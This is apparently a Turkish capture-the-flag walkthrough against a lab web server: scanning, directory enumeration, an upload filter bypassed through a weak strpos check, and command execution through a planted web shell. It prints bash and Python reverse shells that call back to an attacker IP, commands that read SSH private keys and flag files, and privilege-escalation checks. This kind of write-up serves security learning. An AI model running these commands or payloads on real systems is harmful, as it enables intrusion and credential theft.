🔐 Tarama
Bir makineye saldırı yapmadan önce, o makinenin açık olan servislerini ve portlarını öğrenmek gerekir. Bu, nereden başlayacağımızı anlamamızı sağlar. Portlar ve servisler hakkında bilgi almak için Nmap kullanıyoruz:

-sV: Servis versiyonlarını öğrenmek için
-sC: Yaygın scriptleri çalıştırmak için kullanılır.

<pre>nmap -sV -sC 10.81.185.192</pre>
🔐 Web Servisine Erişim
Tarama sonucu web sunucusunun (port 80) açık olduğunu gördük. İlk adım olarak, web sitesine erişim sağlıyoruz:

<pre>http://10.81.185.192</pre>
🔐 Sayfa Kaynağı İncelemesi
Web sayfalarında genellikle yorum satırları veya gizli bilgiler bırakılabilir. Sayfa kaynağına (Ctrl+U) bakarak, saldırıya veya ipuçlarına yarayacak herhangi bir bilgi var mı diye kontrol ediyoruz.

<pre>&lt;!-- im no security expert - thats what we have a stable of nerds for - but isn't /cvs on the public website a privacy risk? --&gt;</pre>
Bu yorum bize /cvs dizininin public olarak erişilebilir olduğunu ve potansiyel bir güvenlik riski oluşturduğunu gösteriyor.

🔐 Gizli Dosya ve Dizinleri Bulma
Web sunucusunda, normalde erişim sağlanmayan veya gizli olan dizin ve dosyalar olabilir. Bunlar bazen önemli bilgiler içerebilir. Bunun için Gobuster gibi araçlarla dizin taraması yapıyoruz:

<pre>gobuster dir -u http://10.81.185.192 -w /usr/share/wordlists/dirb/common.txt</pre>
-w: Kelime listesi (wordlist) ile dizinleri deniyor

Bulunan kritik dizin:

/cvs/ → CVS version kontrol dizini

🔐 /cvs Dizini Analizi
/cvs dizinine eriştiğimizde bir file upload formu bulduk. Sayfa kaynağını incelediğimizde:

<pre>$target_dir = "cvs/"; $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]); if (!strpos($target_file, ".pdf")) { echo "Only PDF CVs are accepted."; }</pre>
Zafiyet: strpos() fonksiyonu sadece ".pdf" substring'ini arıyor, bu nedenle shell.php.pdf gibi dosyalar kabul ediliyor.

🔐 Hacker'ın Shell'ini Bulma
Dizin taramasında başka bir hacker'ın yüklediği shell'i keşfettik:

<pre>/cvs/shell.pdf.php</pre>
Shell'e erişim sağladık:

<pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=whoami</pre>
Çıktı: www-data

🔐 Sistem Keşfi
Web shell üzerinden sistemde keşif yapmaya başladık:

<pre># Kullanıcı listesi http://10.81.185.192/cvs/shell.pdf.php?cmd=ls+/home # user.txt flag'ini ara http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/home+-name+user.txt # Tüm sistemde flag ara http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/+-name+*.txt+-type+f+2>/dev/null</pre>
🔐 Flag'leri Okuma
Bulduğumuz user ve flag dosyalarını okuduk:

<pre># user.txt flag'ini oku http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/home/[KULLANICI_ADI]/user.txt # proof.txt flag'ini oku (root dizininde) http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/root/proof.txt</pre>
🔐 Reverse Shell ile Kalıcı Erişim
Web shell üzerinden reverse shell alarak kalıcı erişim sağladık:

<pre># Dinleyici başlat nc -lvnp 4444 # Reverse shell tetikle http://10.81.185.192/cvs/shell.pdf.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.23.164.70/4444%200>%261' # Alternatif Python reverse shell http://10.81.185.192/cvs/shell.pdf.php?cmd=python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.23.164.70%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])'</pre>
🔐 SSH Anahtarı Keşfi
Sistemde SSH anahtarlarını aradık:

<pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/home+-name+id_rsa+-type+f+2>/dev/null http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/home/[KULLANICI]/.ssh/id_rsa</pre>
🔐 Privilege Escalation Kontrolleri
Root yetkileri için sistemde kontrol yaptık:

<pre># SUID dosyalarını ara http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/+-perm+-4000+-type+f+2>/dev/null # Sudo yetkilerini kontrol et http://10.81.185.192/cvs/shell.pdf.php?cmd=sudo+-l+2>/dev/null # Cron jobs kontrol et http://10.81.185.192/cvs/shell.pdf.php?cmd=crontab+-l+2>/dev/null</pre>
🎯 Öğrenilen Dersler
